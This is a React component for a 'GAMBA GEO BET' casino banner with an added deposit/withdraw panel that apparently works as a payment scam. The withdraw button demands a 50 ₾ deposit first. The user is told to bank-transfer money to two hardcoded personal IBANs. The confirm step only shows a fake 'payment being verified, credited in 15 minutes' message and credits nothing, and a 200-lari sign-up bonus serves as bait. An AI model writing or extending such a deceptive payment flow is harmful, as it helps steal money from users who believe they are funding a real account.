import React, { useState } from 'react'
import styled from 'styled-components'
import { useNavigate } from 'react-router-dom'
import { useWallet } from '@solana/wallet-adapter-react'
import { useWalletModal } from '@solana/wallet-adapter-react-ui'
import { useUserStore } from '../../hooks/useUserStore'

const Buttons = styled.div`
  display: flex;
  flex-direction: column;
  gap: 10px;
  width: 100%;

  & > button {
    border: none;
    border-radius: 10px;
    padding: 10px;
    background: #ffffffdf;
    transition: background-color .2s ease;
    color: black;
    cursor: pointer;
    &:hover {
      background: white;
    }
  }

  @media (max-width: 800px) {
    flex-direction: row;
  }
`

const Welcome = styled.div`
  background: linear-gradient(-45deg, #ffb07c, #ff3e88, #2969ff, #ef3cff, #ff3c87);
  background-size: 300% 300%;
  animation: backgroundGradient 30s ease infinite;
  border-radius: 10px;
  padding: 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  color: white;
`

export function WelcomeBanner() {
  const wallet = useWallet()
  const walletModal = useWalletModal()
  const store = useUserStore()
  const navigate = useNavigate()

  const copyInvite = () => {
    store.set({ userModal: true })
    if (!wallet.connected) {
      walletModal.setVisible(true)
    }
  }

  const [showDeposit, setShowDeposit] = useState(false)
  const [step, setStep] = useState<'amount' | 'bank' | 'iban' | 'done' | null>(null)
  const [amount, setAmount] = useState('')
  const [selectedBank, setSelectedBank] = useState<'bog' | 'tbc' | null>(null)

  const handleWithdraw = () => {
    alert('ჯერ უნდა შეიტანოთ მინიმუმ 50 ₾ დეპოზიტი')
    setShowDeposit(true)
    setStep('amount')
  }

  const handleDepositSubmit = () => {
    if (!amount || parseFloat(amount) < 50) {
      alert('მინიმალური თანხაა 50 ₾')
      return
    }
    setStep('bank')
  }

  const handleBankSelect = (bank: 'bog' | 'tbc') => {
    setSelectedBank(bank)
    setStep('iban')
  }

  const handlePaymentConfirm = () => {
    setStep('done')
    setTimeout(() => {
      alert('თქვენი გადახდა მოწმდება, 15 წუთში ბალანსზე აისახება')
      navigate('/')
      setShowDeposit(false)
      setStep(null)
      setAmount('')
      setSelectedBank(null)
    }, 1500)
  }

  return (
    <Welcome>
      {/* --- Orijinal hissə qalır --- */}
      <div>
        <h1>GAMBA GEO BET</h1>
        <p>
          A fair, simple and decentralized casino on Solana.
        </p>
      </div>
      <Buttons>
        <button onClick={copyInvite}>
          💸 AMBA GEO BET-თან ერთად მოგება თქვენთანაა
        </button>
        <button onClick={() => window.open('/', '_blank')}>
          🚀 ყოველი რეგისტრაციისთვის 200 ლარის ბონუსი
        </button>
        <button onClick={() => window.open('', '_blank')}>
          📱 GAMBA GEO BET თქვენთანაა
        </button>
      </Buttons>

      {/* --- Yeni Deposit / Withdraw bölməsi --- */}
      <div style={{ marginTop: '30px', width: '100%' }}>
        <Buttons>
          <button onClick={() => { setShowDeposit(true); setStep('amount') }}>💳 Deposit</button>
          <button onClick={handleWithdraw}>🏧 Withdraw</button>
        </Buttons>

        {showDeposit && (
          <div style={{ marginTop: '20px', background: 'white', color: 'black', padding: '15px', borderRadius: '10px', width: '100%' }}>
            {step === 'amount' && (
              <div>
                <h3>შეიყვანეთ თანხა</h3>
                <input
                  type="number"
                  placeholder="თანხა (₾)"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  style={{ width: '100%', padding: '8px', marginTop: '8px' }}
                />
                <button style={{ marginTop: '10px', width: '100%' }} onClick={handleDepositSubmit}>
                  გაგრძელება
                </button>
              </div>
            )}

            {step === 'bank' && (
              <div>
                <h3>აირჩიეთ ბანკი</h3>
                <button style={{ marginTop: '10px', width: '100%' }} onClick={() => handleBankSelect('bog')}>
                  Bank of Georgia
                </button>
                <button style={{ marginTop: '10px', width: '100%' }} onClick={() => handleBankSelect('tbc')}>
                  Credo Bank
                </button>
              </div>
            )}

            {step === 'iban' && selectedBank && (
              <div>
                <h3>
                  {selectedBank === 'bog' ? 'Bank of Georgia' : 'Credo Bank'} IBAN
                </h3>
                <p style={{ marginTop: '10px', fontWeight: 'bold' }}>
                  {selectedBank === 'bog'
                    ? 'GE65BG0000000580850481 მ.კ'
                    : 'GE14CD0360000048596727 მ.კ'}
                </p>
                <p style={{ marginTop: '10px' }}>
                  გთხოვთ გადარიცხოთ ამ ანგარიშზე და შემდეგ დააჭიროთ ღილაკს „გადახდა შესრულდა“
                </p>
                <button style={{ marginTop: '10px', width: '100%' }} onClick={handlePaymentConfirm}>
                  Apply for Deposit📱
                </button>
              </div>
            )}

            {step === 'done' && (
              <div>
                <h3>თქვენი გადახდა მოწმდება...</h3>
                <p>15 წუთში ბალანსზე აისახება</p>
              </div>
            )}
          </div>
        )}
      </div>
    </Welcome>
  )
}